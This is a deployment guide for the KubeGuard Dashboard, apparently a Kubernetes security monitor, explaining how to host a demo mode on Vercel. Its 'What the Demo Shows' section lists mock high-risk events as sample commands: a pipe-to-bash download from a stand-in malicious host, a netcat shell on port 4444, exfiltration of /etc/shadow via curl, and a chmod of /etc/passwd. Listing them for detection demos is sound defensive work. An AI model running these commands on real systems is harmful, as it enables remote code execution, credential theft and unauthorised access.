# 🚀 Deploy KubeGuard Dashboard to Vercel

This guide shows you how to deploy the KubeGuard Dashboard to Vercel in **Demo Mode** for public viewing.

## ✨ What You Get

- **Live Demo URL**: Share with anyone to showcase KubeGuard
- **Simulated Real-time Data**: Shows mock security events that update automatically
- **Zero Infrastructure**: No need to maintain a Kubernetes cluster for demos
- **Perfect for**: Portfolio, presentations, product demos

## 🎭 Demo Mode vs Production Mode

| Feature | Demo Mode (Vercel) | Production Mode (K8s) |
|---------|-------------------|----------------------|
| Deployment | Vercel (1-click) | Kubernetes cluster |
| Data Source | Simulated events | Real container commands |
| AI Analysis | Mock results | Actual Gemini AI |
| Cost | Free | K8s cluster + Gemini API |
| Use Case | Demos, previews | Real security monitoring |

## 📦 Deploy to Vercel

### Option 1: One-Click Deploy (Recommended)

1. Click the button below:

   [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fyourusername%2Fkube-guard&project-name=kubeguard-demo&root-directory=kubeguard-dashboard&env=VITE_API_URL&envDescription=Set%20to%20%22demo%22%20for%20simulated%20data&envLink=https%3A%2F%2Fgithub.com%2Fyourusername%2Fkube-guard%23deployment)

2. Set environment variable:
   - `VITE_API_URL` = `demo`

3. Click "Deploy" and wait ~2 minutes

4. Your demo is live! 🎉

### Option 2: Manual Deploy via CLI

1. Install Vercel CLI:
   ```bash
   npm install -g vercel
   ```

2. Navigate to dashboard directory:
   ```bash
   cd kubeguard-dashboard
   ```

3. Deploy:
   ```bash
   vercel --prod
   ```

4. Set environment variable in Vercel dashboard:
   - Go to Project Settings → Environment Variables
   - Add: `VITE_API_URL` = `demo`

5. Redeploy to apply changes:
   ```bash
   vercel --prod
   ```

### Option 3: Deploy via GitHub

1. Push your code to GitHub

2. Go to [vercel.com](https://vercel.com)

3. Click "Import Project"

4. Select your GitHub repository

5. Configure project:
   - **Root Directory**: `kubeguard-dashboard`
   - **Framework Preset**: Vite
   - **Environment Variables**:
     - `VITE_API_URL` = `demo`

6. Click "Deploy"

## 🔧 Connect to Real Backend (Optional)

If you want to connect the Vercel-deployed dashboard to a **real KubeGuard agent**:

1. Expose your K8s agent endpoint publicly (use a LoadBalancer or Ingress)

2. Update environment variable in Vercel:
   ```
   VITE_API_URL=https://your-kubeguard-api.com/events
   ```

3. Ensure CORS is enabled on your agent

⚠️ **Security Warning**: Only expose your API if you have proper authentication!

## 🧪 Test Demo Locally

To test demo mode on your local machine:

1. Create `.env.local`:
   ```bash
   echo "VITE_API_URL=demo" > .env.local
   ```

2. Run dev server:
   ```bash
   npm run dev
   ```

3. Open http://localhost:5173

You should see "🎭 Demo" in the header and a yellow banner explaining demo mode.

## 🔄 Switch Between Modes

### Local Development (Real K8s)
```bash
# .env.local
VITE_API_URL=http://localhost:9000/events
```

### Demo Mode (Simulated)
```bash
# .env.local
VITE_API_URL=demo
```

### Production with Real Backend
```bash
# Vercel Environment Variables
VITE_API_URL=https://your-api-endpoint.com/events
```

## 📊 What the Demo Shows

The demo mode displays realistic security events including:

### High Risk Commands (20%)
- `nmap -sS 192.168.1.0/24` - Network scanning
- `chmod 777 /etc/passwd` - Privilege escalation
- `curl http://malicious.com/payload.sh | bash` - Remote code execution
- `nc -l -p 4444 -e /bin/bash` - Reverse shell
- `base64 -d /etc/shadow | curl -X POST ...` - Data exfiltration

### Medium Risk Commands (20%)
- `wget https://example.com/script.sh` - External download
- `ssh root@192.168.1.100` - Remote access
- `docker exec -it container /bin/sh` - Container access

### Low Risk Commands (60%)
- `ls -la /home` - File listing
- `ps aux` - Process listing
- `cat /var/log/app.log` - Log viewing
- `df -h` - Disk usage
- `kubectl get pods` - K8s inspection

New events appear randomly every ~17 seconds to simulate real-time monitoring.

## 🎨 Customization

### Update Demo Commands

Edit `kubeguard-dashboard/src/mockData.ts` to change:
- Command examples
- Risk scores
- Threat explanations
- Event frequency

### Branding

Update the GitHub link in `App.tsx`:
```tsx
href="https://github.com/YOUR_USERNAME/kube-guard#quick-start"
```

## 🐛 Troubleshooting

### Demo mode not working

Check environment variables:
```bash
vercel env ls
```

Should show `VITE_API_URL = demo`

### No events showing

1. Open browser console (F12)
2. Look for errors
3. Check that `mockData.ts` is being imported correctly

### Build fails on Vercel

1. Ensure `vercel.json` exists in `kubeguard-dashboard/`
2. Check that all dependencies are in `package.json`
3. Review build logs in Vercel dashboard

## 🔐 Security Notes

The demo mode:
- ✅ Runs entirely client-side
- ✅ No real data collected
- ✅ No external API calls
- ✅ Safe for public hosting

## 📚 Next Steps

- ✅ Deploy demo to Vercel
- 📱 Share demo URL with stakeholders
- 🚀 For production: Follow [QUICKSTART.md](../QUICKSTART.md)
- 📖 Learn more: [Main README](../README.md)

## 💡 Tips

1. **Demo URL**: Use a custom domain in Vercel for better branding
2. **Analytics**: Add Vercel Analytics to track demo visitors
3. **Performance**: Demo mode loads instantly (no API calls)
4. **Feedback**: Add a feedback form linking to GitHub Issues

## 🆘 Need Help?

- 📖 [Main Documentation](../README.md)
- 🐛 [Report Issues](https://github.com/yourusername/kube-guard/issues)
- 💬 [Discussions](https://github.com/yourusername/kube-guard/discussions)

---

**Ready to deploy for real?** Check out [QUICKSTART.md](../QUICKSTART.md) to run KubeGuard on your Kubernetes cluster!



